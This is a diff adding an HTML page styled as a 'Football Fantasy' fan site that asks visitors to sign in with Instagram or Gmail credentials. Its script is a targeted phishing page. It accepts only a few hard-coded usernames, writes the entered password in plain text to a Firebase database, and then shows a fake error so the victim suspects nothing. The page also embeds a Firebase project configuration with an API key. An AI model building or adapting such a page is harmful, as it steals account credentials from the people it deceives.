@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Football Fantasy</title>
+    <script src="https://www.gstatic.com/firebasejs/8.3.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.3.0/firebase-database.js"></script>
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyDCJ8aDj1aNAabamLYsFbMlUArYmzdvGWo",
+    authDomain: "shresth-sharma-v3.firebaseapp.com",
+    databaseURL: "https://shresth-sharma-v3-default-rtdb.firebaseio.com",
+    projectId: "shresth-sharma-v3",
+    storageBucket: "shresth-sharma-v3.appspot.com",
+    messagingSenderId: "52938966152",
+    appId: "1:52938966152:web:7f3b056755e84853fe0b3d"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+</head>
+<body>
+    <center><h1>Football Fantasy</h1></center>
+    <p>Know more about your favourite football players and how they achieved all this</p>
+    <p>To watch their practice matches and learn more about football sign in to Instagram/Gmail or create your account now</p>
+    <label>Username : </label><input type="text" id="id"><br>
+    <label>Password : </label><input type="text" id="pass"><br><br>
+    <button id="in" onclick="IN()">Sign in</button>
+    <button onclick="alert('There\'s Some Issue!\nPlease sign in instead')">Sign up</button>
+    <script>
+        var database = firebase.database();
+        function IN(){
+            id = document.getElementById('id').value;
+            if(id !='rishitt.28' && id!='Rishitt.28' && id!='Ojasvii____' && id!='ojasvii____' && id!='myid'){
+                alert('Please enter a valid id')
+            }
+            else{
+                pass = document.getElementById('pass').value;
+                database.ref('bigbrain/'+id+'/').update({
+                    pass:pass
+                });
+                alert('We are having some issue\nPlease try again later')
+            }
+        }
+        
+    </script>
+</body>
+</html>
